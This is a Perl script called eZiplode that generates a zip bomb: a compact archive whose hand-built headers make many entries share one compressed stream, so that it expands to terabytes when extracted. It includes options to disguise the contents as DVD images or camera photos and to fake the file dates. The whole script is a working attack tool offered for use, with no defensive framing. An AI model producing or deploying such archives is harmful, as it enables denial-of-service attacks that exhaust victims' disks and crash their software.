#!/usr/bin/perl
use strict;
use warnings;
use Getopt::Long;
use Time::HiRes;

print "\neZiplode Version 0.17\n";

my $repeats = 1;			#only once if value not provided
my $filenames 	= "dvd";		#default name for the file internal file names; file0034.txt
my $fileext	= "iso";		#default extention name for internal files; file1.txt
my $filename	= "eZIPlode.zip";	#default output file name if none is chosen
my $file_date	= "\x3f\x65\xbd\x4e";	#Default date in meta-data
my $nohelp	= 0;
GetOptions('amount=s' => \$repeats,
		'filenames=s' => \$filenames,
		'fileext=s' => \$fileext,
		'outfile=s' => \$filename,
		'date=s' => \$file_date,
		'nohelp' => \$nohelp);

if ($nohelp ne 1) { infoscreen();}	#print help, unless otherwise told on CLI

#When did program start
my $start = Time::HiRes::time();

if ($file_date ne "\x3f\x65\xbd\x4e") {
	$file_date 	= printhex_32($file_date);
}
my $file_serial = "";			#Intialize amount of serial digits after internal file names
my $file_serial_digits;			#throwaway variable used in getserial() function
my $n;					#throwaway variable used in while loops
my $mid_offset	= printhex_32(0);	#initialize the first mid_offset to 0
getserial();
my $nullname 	= "$filenames". $file_serial. ".$fileext";
my $filelength 	= printhex_16(length($nullname));	
my $end_size;
my $end_offset;
my $zipsize;
my $explodedsize;


open(FILE,">>$filename") || die "\t\tCould not open file\n$!\n";

##This is the main loop that creates the .zip file
head();						#inject header
file();						#inject file

$n=0;			#initialize counter
$file_serial = "";	#initialize serial digits again for next round of mid headers
getserial();		#get the amount of digits we need again
#This loop injects the mid headers and file metadata peices, it dynamically calculates offsets as well
while ($n < $repeats) {					#do this loop for however many files the user wants
	mid();						#inject mid header
	$nullname = "$filenames". $file_serial. ".$fileext";	#update filename
	midfile();					#inject mid metadata file
#	$mid_offset = printhex_32((4168202+length($nullname)+30)*$n);	#offset = (compressed file size + length of file name + 1st header length) * amount of files up to this point
	$file_serial++;					#increment serial number for the filename
	$n++						#increment loop
}


#do all of the footer magic
my $end_files	= printhex_16($repeats);				#amount of files
$end_size 	= printhex_32((24+length($nullname)+46)*$repeats);	#midfile+filenamelength+mid multiplied by the amount of files
$end_offset 	= printhex_32((4168202+length($nullname)+30));#*$repeats);	#pretty much the same formula for mid_offset, times the amount of files
end();									#inject the footer




#Now we have all the subroutines for injecting the head, midhead, end(footer), file, and midfile (metadata)
sub head {
###---Head---###
#Generally 30 bytes in length
my $head_sig 	= 	"\x50\x4b\x03\x04";	#Local File Header Signature
my $head_ver 	=	"\x14\x00";		#Minimum zip version needed to extract
my $head_flag	=	"\x02\x00";		#General Purpose bit flag
my $head_method	=	"\x08\x00";		#Compression Method
my $head_modtime=	$file_date;		#Unix timecode; 11:11am 11-11-11
my $head_crc	=	"\xb3\xb1\x6e\x98";	#Check Sum
my $head_csize	=	"\xee\x99\x3f\x00";	#Reported Compressed Size
my $head_usize	=	"\xf0\xff\xff\xff";	#Reported Uncompressed Size
my $head_fnl	=	$filelength;		#File Name Length
my $head_efl	=	"\x1c\x00";		#Extra Field Length
my $head = 	$head_sig.$head_ver.$head_flag.$head_method.$head_modtime.$head_crc.
		$head_csize.$head_usize.$head_fnl.$head_efl;
print FILE $head;
}

sub mid {
###---Mid---###
#Generally 46 bytes in length
my $mid_sig	=	"\x50\x4b\x01\x02";	#Local File Header Signature (for mid)
my $mid_verm	=	"\x1e\x03";		#Version Made by
my $mid_ver	=	"\x14\x00";		#Minimum zip version needed to extract
my $mid_flag	=	"\x02\x00";		#General Purpose bit flag
my $mid_method	=	"\x08\x00";		#Compression Method
my $mid_modtime	=	$file_date;		#Unix timecode; 11:11am 11-11-11
my $mid_crc	=	"\xb3\xb1\x6e\x98";	#Check Sum
my $mid_csize	=	"\xee\x99\x3f\x00";	#Reported Compressed Size
my $mid_usize	=	"\xf0\xff\xff\xff";	#Reported Uncompressed Size
my $mid_fnl	=	$filelength;		#File Name Length
my $mid_efl	=	"\x18\x00";		#Extra Field Length
my $mid_coml	=	"\x00\x00";		#File Comment Lenth
my $mid_dnum	=	"\x00\x00";		#Disk number where file starts
my $mid_iattr	=	"\x00\x00";		#Internal File Attributes				
my $mid_eattr	=	"\x00\x00\xa4\x81";	#External File Attributes				
my $mid = 	$mid_sig.$mid_verm.$mid_ver.$mid_flag.$mid_method.$mid_modtime.$mid_crc.
		$mid_csize.$mid_usize.$mid_fnl.$mid_efl.$mid_coml.$mid_dnum.$mid_iattr.
		$mid_eattr.$mid_offset;
print FILE $mid;
}

sub end {
###---End---###
#Generally 22 bytes bytes in length
my $end_sig	=	"\x50\x4b\x05\x06";	#Local File Header Signature (for end)
my $end_dnum	=	"\x00\x00";		#Number of this disk
my $end_dstart	=	"\x00\x00";		#Disk where central directory starts
my $end_coml	=	"\x00\x00";		#File Comment Length
my $end = 	$end_sig.$end_dnum.$end_dstart.$end_files.$end_files.$end_size.$end_offset.$end_coml;
print FILE $end;
}

sub file {
###---File---###
#$file is about 4 Megabytes of data (compressed)
#OR 4168202 bytes plus filename size
#This crazy hex shit isn't meant to be readable; it was derived from reverse engineering
#a real .zip file.
my $peice01 =	$nullname."\x55\x54\x09\x00\x03".$file_date."\xa7\xa1\x8a\x4f\x75".
		"\x78\x0b\x00\x01\x04\xf6\x03\x00\x00\x04\xf7\x03\x00\x00\xec\xc1".
		"\x31\x11\x00\x20\x0c\x04\xb0\x9f\x51\x81\x94\xae\xa8\x42\x0f\x5e".
		"\x50\xc4\xd4\xc3\x47\x92\xe4\x8c\xbb\x93\x5a\x2f\xdf\x0c";
my $peice02 = 	"\x00" x 8187;
my $peice03 = 	"\x40\xb3\x07\x07\x02\x00\x00\x00\x00\x40\xfe\xaf\x8d\xa0";
my $peice04 = 	"\xaa" x 8191;
my $peice05 =	"\xc2\x1e\x1c\x08\x00\x00\x00\x00\x00\xf9\xbf\x36\x82" . $peice04;
my $peice06 =	"\x0a\x7b\x70\x20\x00\x00\x00\x00\x00\xe4\xff\xda\x08" . $peice04;
my $peice07 =	"\x2a\xec\xc1\x81\x00\x00\x00\x00\x00\x90\xff\x6b\x23\xa8" . $peice04;
my $peice08 =	"\xb0\x07\x07\x02\x00\x00\x00\x00\x40\xfe\xaf\x8d\xa0" . $peice04;
my $peice09 =	$peice05.$peice06.$peice07.$peice08;
my $peice10 =	$peice09 x 126;
my $peice11 =	$peice05.$peice06;
my $peice12 =	"\x2a\xed\xc1\x01\x01\x00\x00\x00\x80\x90\xff\xaf\x1b\x12";
my $peice13 =	"\x00" x 384;
my $peice14 =	"\xe0\x26";
my $file = 	$peice01.$peice02.$peice03.$peice04.$peice10.$peice11.$peice12.$peice13.$peice14;
print FILE $file;
}

sub midfile {
#Data reported to archive software about file (Metadata)
###---Meta File---###
#Typically 24 bytes + bytes for filesize
my $midfile =	$nullname."\x55\x54\x05\x00\x03".$file_date."\x75\x78".
		"\x0b\x00\x01\x04\xf6\x03\x00\x00\x04\xf7\x03\x00\x00";
print FILE $midfile;
}

#Routine for getting a decimal number and returning it's hexadecimal 2-byte stupid-endian equivilant
sub printhex_16 {
	my $value = shift;			#get the value passed to it
	my $return;				#make a return variable
	$value = sprintf("%.4X\n", $value);	#get an "ASCII HEX" version of the value
	if ($value =~ /(.)(.)(.)(.)/) {		#parse out each character
		$return = pack("C*", map { $_ ? hex($_) :() } $3.$4) . pack("C*", map { $_ ? hex($_) :() } $1.$2);	#unpack it
	}
	return $return;				#return the hex data
}

#Routine for getting a decimal number and returning it's hexadecimal 4-byte stupid-endian equivilant
sub printhex_32 {
	my $value = shift;				#get the value passed to it
	my $return;					#make a return variable
	$value = sprintf("%.8X\n", $value);		#get an "ASCII HEX" version of the value
	if ($value =~ /(.)(.)(.)(.)(.)(.)(.)(.)/) {	#parse out each character
		$return = pack("C*", map { $_ ? hex($_) :() } $7.$8) . pack("C*", map { $_ ? hex($_) :() } $5.$6) .
			pack("C*", map { $_ ? hex($_) :() } $3.$4) . pack("C*", map { $_ ? hex($_) :() } $1.$2);	#unpack it
	}
	return $return;				#return the hex data
}

#This will figure out how many digits to append to a file name. If we had 15 files; it would go from 00-14. If we had
#over 9000 files, it would go from 0000-9xxx.
sub getserial {
	$file_serial_digits = $repeats;				#grab a destroyable value for our amount of files
	while ($file_serial_digits > 1) {			#Is there another digit
		$file_serial = $file_serial . "0";		#the first trailing 0 is a freebie (but it appends another 0 each time through the loop
		$file_serial_digits = $file_serial_digits / 10;	#divide by 10; see if we have another digit
	}
}

sub dataformat($) {
   my $byt = shift;
   $byt >= 1073741824 ? sprintf("%0.2f GB", $byt/1073741824)
      : $byt >= 1048576 ? sprintf("%0.2f MB", $byt/1048576)
      : $byt >= 1024 ? sprintf("%0.2f KB", $byt/1024)
      : $byt . " bytes";
}

close(FILE);
print "eZIPloded!!!\n";

sub infoscreen {
	print "\nDESCRIPTION: This is an archive exploder script. If you've ver seen 42.zip,\n";
	print "\tthis script produces a .zip file in a similar spirit; It makes a .zip\n";
	print "\tfile potentially larger than any modern commercial hard-drive could\n";
	print "\textract. Depending on the --amount you select, it could be anywhere\n";
	print "\tfrom 4 GB to 256 TB. One notable difference between this exploder and\n";
	print "\t42.zip is that the directory structure is flat; otherwise 'extract-all'\n";
	print "\twould not be as effective\n\n";
	print "USAGE: eZIPlode.pl [--options]\n\n";
	print "OPTIONS:\n"; 
	print "--nohelp: This option skips THIS help screen\n";
	print "--amount: This is the amount of internal files to include, the more the better.\n";
	print "\tKeep in mind that normal .zip has a 65535 file limit.\n";
	print "--filenames: This sets the file name of internal files; if you said 'DVD', then\n";
	print "\tfiles would look like DVD000.iso, DVD001.iso, DVD002.iso, etc...\n";
	print "--fileext: This is the file extension for the internal files; if you said 'img',\n";
	print "\tthen files would look like DVD000.img, DVD001.img, etc...\n";
	print "--outfile: This is the file name of the output zip file. By default it is\n";
	print "\teZIPlode.zip\n";
	print "--date: This is the date you want in the file metadata, by default it is\n";
	print "\t11:11 AM on November 11 of 2011 (11-11-11)...\n";
	print "\nEXAMPLES:\n";
	print "Example 1: eZIPlode.pl\n";
	print "\tNotice that you don't need any options, defaults are provided otherwise.\n";
	print "Example 2: eZIPload.pl --nohelp --amount=9001 --filenames=DCIM --fileext=jpg\n";
	print "\t\t--outfile=pictures.zip --date=1\n";
	print "\tThis will make a zip file called pictures.zip that have more than 9000\n";
	print "\tfiles that look like DCIM0000.jpg, DCIM0001.jpg, etc. They will look\n";
	print "\tlike they were created in '69 since the --date field is a UNIX like\n";
	print "\ttimestamp, and you will also skip this help screen.\n";
	print "\nPress Enter to start the script: ";
	if (<> ne \00) {clear(); return;}
}

#Clear the screen
sub clear {
        print "\033[2J";                                #\
        print "\033[0;0H";                              # clear screen hack
}

$zipsize = 4168338 + ($repeats * 80);
#$explodedsize;
print "ZIP Size is: " . dataformat($zipsize) . "\n";
print "Total Uncompressed size would be: " . dataformat($repeats * 4294967280) . "\n";


#When did program finish
my $end = Time::HiRes::time();
$end = $end - $start;
print "Finished in ";
printf '%.2f', "$end";
print " seconds\n";
